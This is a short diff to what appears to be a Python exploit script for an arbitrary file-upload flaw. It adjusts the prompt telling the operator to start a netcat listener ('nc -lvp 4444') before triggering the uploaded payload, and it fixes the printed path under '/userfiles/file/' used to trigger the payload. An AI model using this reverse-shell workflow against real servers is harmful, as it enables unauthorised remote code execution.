@@ -24,15 +24,14 @@ def main():
     args = process_args(argparse.ArgumentParser())
     request, targetfilename = init(args)
     check_response(request, args.basepath, targetfilename)
-    
-    input('<<< Make sure you have a listener active (e.g. nc -lvp 4444) before triggering the payload >>>')
+    input('[info] Make sure you have a listener active \n[info] (e.g. nc -lvp 4444) before triggering the payload\n<press any key>\n')
 
 
 # check response
 def check_response(request, basepath, targetfilename):
     if request.status_code == 200:
         print('[+] File successfully uploaded!')
-        print(F'[+] Goto \'/{basepath}/userfiles/file/{targetfilename}\' to trigger the payload!')
+        print(F'[+] Goto \'{basepath}/userfiles/file/{targetfilename}\' to trigger the payload!')
     else:
         print('[-] File upload failed!')
         print('[-] Status Code: {request.status_code} - {request.status_reason}')
